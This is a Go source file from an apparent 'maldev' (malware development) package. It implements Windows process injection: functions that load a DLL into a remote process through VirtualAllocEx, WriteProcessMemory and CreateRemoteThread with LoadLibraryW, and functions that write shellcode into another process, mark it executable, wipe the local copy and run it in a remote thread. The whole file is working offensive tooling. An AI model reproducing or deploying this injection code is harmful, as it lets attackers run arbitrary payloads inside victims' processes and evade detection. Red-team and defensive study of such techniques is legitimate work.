package maldev

import (
	"errors"
	"path/filepath"
	"unsafe"
)

func InjectDllToRemoteProcess(hProcess HANDLE, dllName LPWSTR) error {
	// Get the full path of the DLL
	dllPath, err := filepath.Abs(dllName.String())
	if err != nil {
		return errors.New("[!] Failed to get absolute path of DLL " + err.Error())
	}
	err = dllName.Set(dllPath)
	if err != nil {
		return errors.New("[!] Failed to set DLL path " + err.Error())
	}
	Debugf("DLL Path : %s\n", dllName.String())
	// dwSizeToWrite := SIZE_T(dllName.Size())
	dwSizeToWrite := SIZE_T(2 * len(dllName.String()))
	pLoadLibraryW, err := GetLoadLibraryWHandle()
	if err != nil {
		return errors.New("[!] Failed to get LoadLibraryW handle " + err.Error())
	}
	Debugf("LoadLibraryW Handle : %p\n", &pLoadLibraryW)
	pAddress, err := VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return errors.New("[!] Failed to allocate memory in remote process " + err.Error())
	}
	Debugf("Allocated Memory At : 0x%X \n", pAddress)
	// Print dllName Pointer address and value
	pDLLName, err := dllName.Pointer()
	if err != nil {
		return errors.New("[!] Failed to get DLL name pointer " + err.Error())
	}
	DebugWait("Write")
	lpNumberOfBytesWritten := SIZE_T(0)
	err = WriteProcessMemory(hProcess, pAddress, LPCVOID(unsafe.Pointer(pDLLName)), dwSizeToWrite, &lpNumberOfBytesWritten)
	if err != nil {
		return errors.New("[!] Failed to write to remote process memory " + err.Error())
	}
	Debugf("Successfully Written %d Bytes\n", lpNumberOfBytesWritten)
	DebugWait("Run")
	Debugf("Executing Payload ... \n")
	hThread, err := CreateRemoteThread(hProcess, NULL, NULL, LPTHREAD_START_ROUTINE(pLoadLibraryW), pAddress, NULL, nil)
	if err != nil {
		return errors.New("[!] Failed to create remote thread " + err.Error())
	}
	defer CloseHandle(hThread)
	Debugf("DONE !\n")
	return nil
}

func InjectShellcodeToRemoteProcess(hProcess HANDLE, pShellcode []byte, sSizeOfShellcode int) (uintptr, error) {
	pShellcodeAddress, err := VirtualAllocEx(hProcess, NULL, SIZE_T(sSizeOfShellcode), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return NULL, errors.New("[!] Failed to allocate memory in remote process " + err.Error())
	}
	Debugf("Allocated Memory At : 0x%X \n", pShellcodeAddress)
	DebugWait("Write Payload")
	var lpNumberOfBytesWritten SIZE_T
	err = WriteProcessMemory(hProcess, pShellcodeAddress, LPCVOID(unsafe.Pointer(&pShellcode[0])), SIZE_T(sSizeOfShellcode), &lpNumberOfBytesWritten)
	if err != nil {
		return NULL, errors.New("[!] Failed to write to remote process memory " + err.Error())
	}
	Debugf("Successfully Written %d Bytes\n", lpNumberOfBytesWritten)
	// memset(pShellcode, '\0', sSizeOfShellcode);
	Memset(unsafe.Pointer(&pShellcode[0]), 0, SIZE_T(sSizeOfShellcode))
	// Make the region executable
	var lpflOldProtect DWORD
	err = VirtualProtectEx(hProcess, pShellcodeAddress, SIZE_T(sSizeOfShellcode), PAGE_EXECUTE_READWRITE, &lpflOldProtect)
	if err != nil {
		return NULL, errors.New("[!] Failed to make memory region executable " + err.Error())
	}
	Debugf("Memory region is now executable\n")
	return uintptr(pShellcodeAddress), nil
}

func RunShellcodeToRemoteProcess(hProcess HANDLE, pShellcodeAddress LPVOID) error {
	DebugWait("Run")
	Debugf("Executing Payload ... \n")
	hThread, err := CreateRemoteThread(hProcess, NULL, NULL, LPTHREAD_START_ROUTINE(pShellcodeAddress), NULL, NULL, nil)
	if err != nil {
		return errors.New("[!] Failed to create remote thread " + err.Error())
	}
	defer CloseHandle(hThread)
	DebugWait("Free Memory")
	err = VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE)
	if err != nil {
		return errors.New("[!] Failed to free memory in remote process " + err.Error())
	}
	Debugf("DONE !\n")
	return nil
}
